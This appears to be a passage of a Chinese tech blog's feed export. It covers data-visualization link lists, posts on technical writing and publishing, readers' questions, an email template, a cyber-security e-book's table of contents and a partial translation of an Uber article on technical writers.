<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="前沿"><a href="#前沿" class="headerlink" title="前沿"></a>前沿</h2><ul>
<li><a href="https://eng.uber.com/avs-autonomous-vehicle-visualization/">Introducing AVS, an Open Standard for Autonomous Vehicle Visualization from Uber</a></li>
</ul>
<p><img src="https://1fykyq3mdn5r21tpna3wkdyi-wpengine.netdna-ssl.com/wp-content/uploads/2019/02/Introducing_AVS_Banner-1-696x522.png" alt=""></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Data-Visualization-Master》"><a href="#《The-Data-Visualization-Master》" class="headerlink" title="《The Data Visualization Master》"></a><a href="https://www.gitbook.com/book/riboseyim/ebook-data-visualization-master">《The Data Visualization Master》</a></h4><h2 id="Science"><a href="#Science" class="headerlink" title="Science"></a>Science</h2><ul>
<li><a href="https://vinci.bioturing.com">Modern data visualization and analytics for life sciences</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzU2MTQ2MDE0Ng==&amp;mid=2247498234&amp;idx=4&amp;sn=50cc689159070a740ecfe575e38e3eb1&amp;source=41#wechat_redirect">Nature：数据可视化可提高科研成果的可重复性 | 2018-03-05 生命奥秘 生物探索</a></li>
<li><a href="http://abruzzi.github.com/2017/03/visualise-the-data-around-you/">邱俊涛：一张漂亮的可视化图表背后</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjI5Mjc2MA==&amp;mid=208296507&amp;idx=2&amp;sn=5ff88d4705b5c1bcc751b55639bbea57&amp;scene=1#rd">NASA中文：一个新的蓝色星球</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA5ODQ1NDIyMQ==&amp;mid=401348208&amp;idx=4&amp;sn=bfe7250b522d355c963d86f7cf648624&amp;scene=1&amp;srcid=0112w3Je6O4ZT8G6SLKlQAz8#rd">Nature :告别信息混乱，如何制作清晰的通路图？</a></li>
<li><a href="https://mp.weixin.qq.com/s/gUHgIirIXDA77kBmKsN7jA">《纽约时报》的“爷爷级”数据可视化|2017-09-27 新京报传媒研究</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>数据可视化</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>作家俱乐部</title>
    <url>/2019/01/07/Writing-Community/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>写作这门手艺</li>
<li>写作工具链</li>
<li>读者社区运营</li>
<li>写作与职业发展</li>
</ul>
<a id="more"></a>
<h2 id="写作这门手艺"><a href="#写作这门手艺" class="headerlink" title="写作这门手艺"></a>写作这门手艺</h2><h4 id="不忘初心"><a href="#不忘初心" class="headerlink" title="不忘初心"></a>不忘初心</h4><ul>
<li><a href="https://riboseyim.github.io/2016/06/11/Writing/" target="_blank" rel="noopener">最佳写作实践：从Evernote到Ulysses</a></li>
</ul>
<h4 id="写作工具链"><a href="#写作工具链" class="headerlink" title="写作工具链"></a>写作工具链</h4><ul>
<li><a href="https://riboseyim.com/2017/06/03/Writing-WriterToolChain/">我的写作工具链</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-OmniGraffle/" target="_blank" rel="noopener">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
</ul>
<h4 id="读者社区运营"><a href="#读者社区运营" class="headerlink" title="读者社区运营"></a>读者社区运营</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/05/Writing-Reader-Question/" target="_blank" rel="noopener">| &gt;&gt;&gt;&gt;&gt; 读者反馈问题汇编 &lt;&lt;&lt;&lt;&lt;&lt; |</a></li>
<li><a href="https://riboseyim.github.io/2017/04/10/Writing-MediaData/" target="_blank" rel="noopener">基于用户需求和最大传播效果为目标的内容创作</a></li>
</ul>
<h4 id="写作与职业发展"><a href="#写作与职业发展" class="headerlink" title="写作与职业发展"></a>写作与职业发展</h4><ul>
<li><a href="https://riboseyim.github.io/2017/10/22/Writing-Technology/" target="_blank" rel="noopener">技术写作与出版</a></li>
<li><a href="https://riboseyim.com/2018/12/02/Writing-Technical/">Uber 技术团队中的作家</a></li>
</ul>
<h2 id="产品孵化"><a href="#产品孵化" class="headerlink" title="产品孵化"></a>产品孵化</h2><h4 id="一般路径"><a href="#一般路径" class="headerlink" title="一般路径"></a>一般路径</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">digraph  aa&#123;</span><br><span class="line">  Series[label=&quot;Series 主题&quot;,shape=&quot;Mrecord&quot;];</span><br><span class="line">  eBook_Preview[label=&quot;电子书【预备】&quot;,shape=&quot;Mrecord&quot;];</span><br><span class="line">  eBook_Publish[label=&quot;电子书【发布】&quot;,shape=&quot;Mrecord&quot;];</span><br><span class="line">  eBook_Grown[label=&quot;电子书【稳定】&quot;,shape=&quot;Mrecord&quot;];</span><br><span class="line"></span><br><span class="line">  Series -&gt; eBook_Preview -&gt; eBook_Publish -&gt; eBook_Grown;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="My-eBooks"><a href="#My-eBooks" class="headerlink" title="My eBooks"></a>My eBooks</h2><h4 id="《The-Linux-Perf-Master》"><a href="#《The-Linux-Perf-Master》" class="headerlink" title="《The Linux Perf Master》"></a><a href="https://riboseyim.com/2017/12/21/eBook-LPM/">《The Linux Perf Master》</a></h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf" target="_blank" rel="noopener">riboseyim.gitbook.io</a></li>
<li><a href="https://pan.baidu.com/s/1C20TAKtYxXeRkTjNy43WOQ" target="_blank" rel="noopener">Edition 0.4 20180714 【百度云盘 pdf、mobi、ePub】 </a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master" target="_blank" rel="noopener">legacy.gitbook.com</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt></p>
<h2 id="孵化器资源池"><a href="#孵化器资源池" class="headerlink" title="孵化器资源池"></a>孵化器资源池</h2><h4 id="工程师的自我修养"><a href="#工程师的自我修养" class="headerlink" title="工程师的自我修养"></a>工程师的自我修养</h4><ul>
<li>Level:Series</li>
<li><a href="https://riboseyim.com/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
<li><a href="https://riboseyim.com/2017/07/05/Law-Of-Engineering/">软件工程实践中的十大法则</a></li>
</ul>
<h4 id="工具癖"><a href="#工具癖" class="headerlink" title="工具癖"></a>工具癖</h4><ul>
<li>Level:Series</li>
</ul>
<h4 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h4><ul>
<li>Level:eBook</li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-BestAppMap">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><ul>
<li><a href="http://riboseyim.github.io/2018/12/01/News-Night-20181201/" target="_blank" rel="noopener">Night News 20181201 | 上线一个纯洁的域名</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title>写作与传播</title>
    <url>/2017/04/10/Writing-MediaData/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>基于用户需求和最大传播效果为目标的内容创作</li>
<li>主要讨论以最大传播效果为目标的内容创作</li>
<li>内容与用户画像分析</li>
<li>内容与传播平台投放</li>
<li>投放平台推荐因子对于内容传播的影响</li>
<li>基于用户需求的创作</li>
</ul>
<a id="more"></a>
<h2 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a><a href="https://riboseyim.github.io/2017/02/09/eBook/" target="_blank" rel="noopener">电子书《Linux Perf Master》</a></h2><p><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details" target="_blank" rel="noopener">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>时间点</th>
<th>订阅用户数</th>
<th>Downloads</th>
<th>Unique visitors</th>
<th>Page Views</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>201701</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
<td>发表在GitBook</td>
</tr>
<tr>
<td>20170630</td>
<td>135</td>
<td>4,206</td>
<td>4,936</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>20170830</td>
<td>154</td>
<td>4,503</td>
<td>5,989</td>
<td>23,505</td>
<td>——-</td>
</tr>
<tr>
<td>20170930</td>
<td>157</td>
<td>4,553</td>
<td>6,471</td>
<td>24,944</td>
<td>——-</td>
</tr>
<tr>
<td>20171218</td>
<td>174</td>
<td>4,702</td>
<td>7,413</td>
<td>27,849</td>
<td>——-</td>
</tr>
</tbody>
</table>
</div>
<p>CSDN下载数 415</p>
<h2 id="一、工具软件系列"><a href="#一、工具软件系列" class="headerlink" title="一、工具软件系列"></a>一、工具软件系列</h2><ul>
<li>20160102－《最佳工程实践－思维利器OmniGraffle》</li>
</ul>
<h4 id="传播效果分析"><a href="#传播效果分析" class="headerlink" title="传播效果分析"></a>传播效果分析</h4><ul>
<li>简书首页推荐－阅读数（600～800～1784）－喜欢（20～30～40+）</li>
<li>长尾效应</li>
</ul>
<h4 id="传播因子分析"><a href="#传播因子分析" class="headerlink" title="传播因子分析"></a>传播因子分析</h4><ul>
<li>工具文的受众较广</li>
<li>简书专题《工具癖》推荐</li>
<li>用户画像：Mac 电脑用户、设计师（WEB UI、App UI）、产品经理、程序员（Mac用户中比例高）、系统分析师、大学生</li>
</ul>
<h2 id="二、开源技术与工程实践系列"><a href="#二、开源技术与工程实践系列" class="headerlink" title="二、开源技术与工程实践系列"></a>二、开源技术与工程实践系列</h2><ul>
<li>20160902－基于LVS的AAA负载均衡架构实践<h4 id="传播效果分析-1"><a href="#传播效果分析-1" class="headerlink" title="传播效果分析"></a>传播效果分析</h4></li>
<li>开源中国【阅读数：】、</li>
<li>长尾效应</li>
</ul>
<h4 id="传播因子分析-1"><a href="#传播因子分析-1" class="headerlink" title="传播因子分析"></a>传播因子分析</h4><ul>
<li>开源中国，每日一博推荐</li>
<li><p>简书今日看点推荐</p>
</li>
<li><p>［译文］《精品架构透视－Stack Overflow》</p>
<h4 id="传播效果分析-2"><a href="#传播效果分析-2" class="headerlink" title="传播效果分析"></a>传播效果分析</h4></li>
<li>高效运维公众号－阅读数6000+</li>
<li>长尾效应</li>
</ul>
<h4 id="传播因子分析-2"><a href="#传播因子分析-2" class="headerlink" title="传播因子分析"></a>传播因子分析</h4><ul>
<li><p>20160605，高效运维公众号转载－阅读数6000+</p>
</li>
<li><p>20160209－《新一代NTopng－架构和可视化分析》－阅读数3500+－持续吸粉</p>
<h4 id="传播因子分析-3"><a href="#传播因子分析-3" class="headerlink" title="传播因子分析"></a>传播因子分析</h4></li>
<li><p>高效运维公众号转载</p>
</li>
<li><p>Oracle 数据库割接迁移实践－首页投稿</p>
<h4 id="传播因子分析-4"><a href="#传播因子分析-4" class="headerlink" title="传播因子分析"></a>传播因子分析</h4></li>
<li>高效运维公众号转载</li>
</ul>
<h2 id="三、其它"><a href="#三、其它" class="headerlink" title="三、其它"></a>三、其它</h2><ul>
<li>20160221－《战斗力－美军体能训练观察》－首页推荐－阅读数1000~1200-喜欢30－评论20－含山民兵转载</li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title>读者交流</title>
    <url>/2017/07/05/Writing-Reader-Question/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>读者交流</li>
<li>典型问题</li>
</ul>
<a id="more"></a>
<h2 id="Issue-List"><a href="#Issue-List" class="headerlink" title="Issue List"></a>Issue List</h2><ul>
<li><a href="https://github.com/riboseyim/riboseyim.com.comment/issues" target="_blank" rel="noopener">https://github.com/riboseyim/riboseyim.com.comment/issues</a></li>
</ul>
<h2 id="典型问题"><a href="#典型问题" class="headerlink" title="典型问题"></a>典型问题</h2><ul>
<li><a href="http://www.jianshu.com/p/b3edeb09ded2#comment-12354047" target="_blank" rel="noopener">jianshu.com@FallownDown</a><br>我觉得您说的很有道理，我也想通过看原版书来学英语，可是看得超慢，而且我的英语语法也不是很好，碰到长难句就搞不懂啥意思了，去网上搜翻译感觉翻译的很生硬，这个问题您有什么好的建议吗？ 20170630</li>
</ul>
<ul>
<li><a href="https://mp.weixin.qq.com/misc/appmsgcomment?action=list_comment&amp;type=0&amp;begin=0&amp;count=10&amp;comment_id=2958367211&amp;token=229345979&amp;lang=zh_CN&amp;mp_version=7" target="_blank" rel="noopener">公众号读者（鱼露）From 《基于Linux单机的负载评估》</a>：关于应用程序优化io算法可否再出一篇？</li>
</ul>
<ul>
<li><p><a href="http://www.jianshu.com/p/f10a2d862863#comments" target="_blank" rel="noopener">jianshu.com@五的四分之三</a>:sflow 这块什么时候能出来啊，比较期待，最好是接受指定端口发送来的sflow数据进行分析。20170512</p>
</li>
<li><p><a href="http://www.jianshu.com/p/f10a2d862863#comments" target="_blank" rel="noopener">jianshu.com@梁家公子哥儿</a>:期待多点探测部署相关的一些的介绍 20170503</p>
</li>
<li><p><a href="http://www.jianshu.com/p/f10a2d862863#comments" target="_blank" rel="noopener">jianshu.com@todayzhou</a>:<br>博主好，请教一个问题。最近领导让装一个ntopng看下里面的具体的功能是否适合当前的网络环境，我按照其他的教程安装好了，然后在交换机上直接端口镜像把流量丢给ntopng服务器，基本的功能里都有数据显示了，但是local http service和matrix以及流量矩阵那些都显示不出来数据，这是因为流量获取的方式不对，还是我缺装了什么东西呢。</p>
</li>
</ul>
<ul>
<li><a href="http://www.jianshu.com/u/ab7cecfb3e24" target="_blank" rel="noopener">jianshu.com@隔壁_老吴</a> ：Ganglia 多播如何跨网段？因为单播需要在服务器端添加所有agent IP，上百台不现实 20170705</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>eBook</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title>如何写邮件</title>
    <url>/2018/07/07/Writing-Email/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>工作邮件模板</li>
</ul>
<a id="more"></a>
<h2 id="工作邮件模板"><a href="#工作邮件模板" class="headerlink" title="工作邮件模板"></a>工作邮件模板</h2><h4 id="Weekly"><a href="#Weekly" class="headerlink" title="Weekly"></a>Weekly</h4><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">## 概要</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 急需解决的问题（特殊情况）</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 一、本周工作总结</span></span><br><span class="line"></span><br><span class="line"><span class="section">#### 1、xxx 工作</span></span><br><span class="line"><span class="section">#### 2、xxx 工作</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 二、下周工作计划</span></span><br><span class="line"></span><br><span class="line"><span class="section">#### 1、xxx 工作</span></span><br><span class="line"><span class="section">#### 2、xxx 工作</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 附件</span></span><br></pre></td></tr></table></figure>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://unreasonable.is/the-7-emails-you-need-to-know-how-to-write/?utm_source=wanqu.co&amp;utm_campaign=Wanqu+Daily&amp;utm_medium=website" target="_blank" rel="noopener">The 7 Emails You Need to Know How to Write | TEJU RAVILOCHAN June 5, 2014</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title>技术写作与出版</title>
    <url>/2017/10/22/Writing-Technology/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>电子书《Linux Perf Master》</li>
<li>读者问题集</li>
<li>被枪毙的选题<a id="more"></a>
</li>
</ul>
<h2 id="一、电子书"><a href="#一、电子书" class="headerlink" title="一、电子书"></a>一、电子书</h2><ul>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details" target="_blank" rel="noopener">《Linux Perf Master》</a></li>
</ul>
<h2 id="二、纸质书"><a href="#二、纸质书" class="headerlink" title="二、纸质书"></a>二、纸质书</h2><h4 id="2-1-那些被出版社枪毙的选题"><a href="#2-1-那些被出版社枪毙的选题" class="headerlink" title="2.1 那些被出版社枪毙的选题"></a>2.1 那些被出版社枪毙的选题</h4><ul>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details" target="_blank" rel="noopener">《Linux Perf Master》</a><br>Edition 1.0 | 2016 | 电子工业出版社</li>
</ul>
<h4 id="2-2-出书记-2016-07-28"><a href="#2-2-出书记-2016-07-28" class="headerlink" title="2.2 出书记:2016-07-28"></a>2.2 出书记:2016-07-28</h4><p>重要的事情说三遍：我要出书，我要出书，我要出书！</p>
<p>缘起：</p>
<p>看过很多书，令人满意的着实不多；<br>好像朋友圈很多人都出书了；<br>现在好像很多编辑找上门的样子；<br>不试试怎么知道不行？万一红了呢？</p>
<p>劣势：<br>智商低，以及没出过</p>
<p>优势：<br>比一般赚大钱的人有时间；<br>比一般搞技术的人更能写；<br>比一般搞理论的人更多实践；</p>
<p>当前阶段：申报选题<br>目标方向：计算机类/简约型/偏通俗/定价：50-70元之间</p>
<p>可能遇到的问题列表（包括但不限于）：</p>
<p>1.如何做市场调研？如何选题？<br>2.如何选择合作出版社？如何在众多写手中脱颖而出？<br>3.如何安排工作和写书的时间？<br>4.如何设定书稿大纲？如何调研素材？<br>5.如何管理书稿编辑过程？工具链如何选择？<br>6.如何与后期团队合作？<br>7.如何寻找推荐人？找谁作序？<br>8.如何处理滞销存货？如何一版再版？</p>
<p>……</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA4Nzg5Nzc5OA==&amp;mid=400254392&amp;idx=1&amp;sn=17198b3ecb12a0a6def632ba03ea1b9e&amp;scene=2&amp;srcid=1105oX0cWe25ed0VD1Nqzvxz&amp;key=d5d05b72c5b818712fa4deb75633387a5271ccd97e0e6a5dd6add4837203d51595050921d4caaa8d6502de5be2aea43ace888b172d060a49b682e033b1453cf89a524ccaa32404275e405d0a209255c9&amp;ascene=0&amp;uin=Mjg2OTA0MDQ4Mg%3D%3D" target="_blank" rel="noopener">王冬生：《Puppet权威指南》作者</a></li>
<li><p><a href="http://m.youku.com/video/id_XMjUxMTM2MTM0OA==.html?f=29473771&amp;o=1&amp;spm=a2h1n.8251843.playList.5~5~A&amp;from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">用黑客思想打造畅销书</a></p>
</li>
<li><p><a href="http://blog.jobbole.com/18251/" target="_blank" rel="noopener">为什么有些技术人员不写博客？</a></p>
</li>
<li><a href="http://blog.jobbole.com/110769/" target="_blank" rel="noopener">我为什么鼓励工程师写博客</a></li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MjQ1NjgyOA==&amp;mid=2247483659&amp;idx=1&amp;sn=65d405a979bd2d2a5f0a75b23df32404&amp;chksm=ec005118db77d80e3e583c67fc38306e699973e690614f91a7ed38090cbefd14b1d8ca498fa3&amp;mpshare=1&amp;scene=1&amp;srcid=0314kKXfg7YCx2NlEYL9aUgc#rd" target="_blank" rel="noopener">InfoQ编辑如何写技术文章：敏捷写作</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDkzNjIwMg==&amp;mid=2651662049&amp;idx=1&amp;sn=7a8773a74beb243df24ff8ebb6911559&amp;chksm=8bbe8b04bcc90212956cdab8eb52454764f3fe3947d723a189071560899350a73614240302b1&amp;mpshare=1&amp;scene=24&amp;srcid=0415QmxxhBlsO10FIsqus0mY&amp;key=d6331003961a2cc4696d924bb08a60ed4330d70a83111623c91ca34aefe38ae5c40b87614b98c9a9adfffd2a7af3c675224b7053dc069090f0733f919498c1bf1caeb4a61d4dc1c4f760016c92c8ef8b&amp;ascene=0&amp;uin=Mjg2OTA0MDQ4Mg%3D%3D" target="_blank" rel="noopener">科研圈：如何高效写论文</a></p>
</li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDkzNjIwMg==&amp;mid=2651659859&amp;idx=1&amp;sn=6fff1bc2a76520d02688a4357c838029&amp;chksm=8bbeb3b6bcc93aa0a9ece4871d1f156fb46e1489c874f4420980600b6ff0f257c5c1c8784dcd&amp;mpshare=1&amp;scene=1&amp;srcid=12133XGjsjlu3R9O1pGWXx5T#rd" target="_blank" rel="noopener">科研圈：如何高效追踪最新文献</a></li>
</ul>
]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>eBook</tag>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>电子书：《The Cyber-Security Master》</title>
    <url>/2018/03/02/eBook-CSM/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-CSM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.com/2017/12/21/eBook-LPM/">《The Linux Perf Master》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></li>
</ul>
<blockquote>
<p>If you cannot explain something in simple terms, you don’t understand it. The best way to learn is to teach. —— Richard Feynman</p>
</blockquote>
<span id="more"></span>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li>Chapter 1: 网络监控技术</li>
<li>性能优化思路：从珠海航展交通管控实践谈起</li>
<li>新一代Ntopng网络流量监控—可视化和架构分析</li>
<li>基于数据分析的网络态势感知</li>
<li>网络数据包的捕获、过滤和分析</li>
<li>Chapter 2: 网络安全技术</li>
<li>警惕 Wi-Fi 漏洞，争取安全上网</li>
<li>Web应用安全：攻击、防护和检测</li>
<li>IPv6 网络协议与网络安全</li>
<li>OpenSSH 并不安全</li>
<li>Linux/XOR.DDoS 木马样本分析</li>
<li>Chapter 3: 网络安全治理</li>
<li>事与愿违的后门程序</li>
<li>美国网络安全立法策略</li>
<li>香港警务处网络安全与科技罪案调查科</li>
</ul>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。</p>
<h2 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h2><p><strong>基本原则：持续发布，争取做到每四个月发布一个新版本</strong></p>
<h4 id="Edition-0-1"><a href="#Edition-0-1" class="headerlink" title="Edition 0.1"></a>Edition 0.1</h4>]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>eBook</tag>
        <tag>Engineering</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Cyber-Security</tag>
        <tag>Developer</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title>工程师的自我修养：技术团队中的作家</title>
    <url>/2018/12/02/Writing-Technical/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Uber 工程团队中的技术作家</li>
<li>技术作家究竟做什么？</li>
<li>技术作家最大的挑战是什么？</li>
<li>关于技术写作最大的误解是什么？</li>
</ul>
<span id="more"></span>
<p>This article is part of an <strong>Uber Engineering</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.com/2018/10/03/Machine-Learning-Uber/">Uber 业务预测系统实践</a></li>
<li><a href="https://riboseyim.com/2018/08/01/OpenSource-Hadoop/">Uber Hadoop 文件系统最佳实践</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Uber JVM 性能追踪工具</a></li>
<li><a href="https://riboseyim.com/2018/12/02/Writing-Technical/">Uber 技术团队中的作家</a></li>
</ul>
<h2 id="Uber-工程团队中的技术作家"><a href="#Uber-工程团队中的技术作家" class="headerlink" title="Uber 工程团队中的技术作家"></a>Uber 工程团队中的技术作家</h2><p>在本文中，Uber 前实习生 Shannon Brown 介绍了她作为技术作家的工作情况，并回答了 Uber 工程团队中有关这一重要角色的常见问题。</p>
<ul>
<li>原标题：Seven Things to Know about Technical Writing at Uber</li>
<li>链接：<a href="https://eng.uber.com/technical-writing-uber">https://eng.uber.com/technical-writing-uber</a></li>
<li>作者：Shannon Brown</li>
<li>发表时间：October 3, 2018</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Uber-Writer-Shannon-Brown-Header-696x447.jpg" alt=""></p>
<p>就在一年多前，我第一次走进 Uber 旧金山办事处。开始了为期 12 周的实习生活，我将开始了解技术写作的世界但我当时不知道会发生什么。</p>
<p>有些问题其实一直萦绕在我耳边，例如技术作家的工作究竟是做什么？我想长期在 Uber 工作吗？在整个实习期间，这些问题的答案变得越来越清晰。我在夏天实习期结束时找到了答案并且确信这就是我想要追求的道路，我最终选择并且非常高兴接受这份工作。</p>
<p>在大学毕业后选择工作时，我面临的问题从来不是我想做什么？而是我怎么能完成所有这些事情呢？我一直在寻找一份能够让我发挥创造力和分析能力的工作。我期望自己能从事很酷的技术创新，但我对编写代码并不感兴趣。我希望有一份工作可以每天都有意外惊喜并且能够持续学习。Amazingly, technical writing checked every box.</p>
<p>技术写作可能是一种被误解的职业，所以我将自己的经历提炼成了七个常见问题。希望未来的作家和技术专家能获益。</p>
<h4 id="技术作家究竟做什么？"><a href="#技术作家究竟做什么？" class="headerlink" title="技术作家究竟做什么？"></a>技术作家究竟做什么？</h4><p>尽管进行了数小时的在线学习，但直到我的实习走向深入并处理了大量激动人心的项目，才终于理解技术作家的工作。</p>
<p>通常，技术作家记录由工程师构建的服务或产品。该文档将有助于新用户理解产品，传播有关服务如何工作的信息，并将技术术语翻译成易于理解的文章。但是，文档工作只是技术作家的诸多任务之一。除了记录，技术作家还可以创建培训材料，分析数据，访问用户，编写产品案例，并提出信息架构问题的解决方案。有些日子你必须像工程师一样思考，而其他人则像项目经理一样。这项工作充满活力，充满挑战，而且收获颇丰。</p>
<h4 id="技术作家最大的挑战是什么？"><a href="#技术作家最大的挑战是什么？" class="headerlink" title="技术作家最大的挑战是什么？"></a>技术作家最大的挑战是什么？</h4><p>作为 Uber 的技术作家，我同时与多个项目的多个团队合作，这一工作模式需要频繁的上下文切换和多任务处理 — 有时是一个挑战！为了确保我能够在最后期限之前保持最佳状态并为我合作的团队服务，我必须保持高效率和时间计划的有条不紊。</p>
<p>因为我与多个团队合作，所以我也有很大的机会发挥影响力。这是非常有益的，因为我编写的文档和创建的学习内容可以帮助我的同事更快地理解、处理和学习信息 — 这对于 Uber 工程效率和生产力来说是一个巨大的帮助。</p>
<h4 id="关于技术写作最大的误解是什么？"><a href="#关于技术写作最大的误解是什么？" class="headerlink" title="关于技术写作最大的误解是什么？"></a>关于技术写作最大的误解是什么？</h4><p>由于技术写作不是一个超级知名的职业道路，因此存在许多误解。最让我印象深刻的说法是技术写作很无聊。</p>
<p>这是完全错误的（除非你讨厌阅读和写作，并且希望与酷炫技术无关）。</p>
<p>事实上，这项工作非常有趣。正如我之前提到的，需要同时研究这么多有趣的项目。如果我对一个人感到厌倦，可以换另一个人休息几个小时。这样我可以保持参与度，也就不会觉得工作无聊。</p>
<p>关于技术写作的另一个主要误解是必须具备技术背景。正如您将在下一节中读到的那样，这也是错误的！</p>
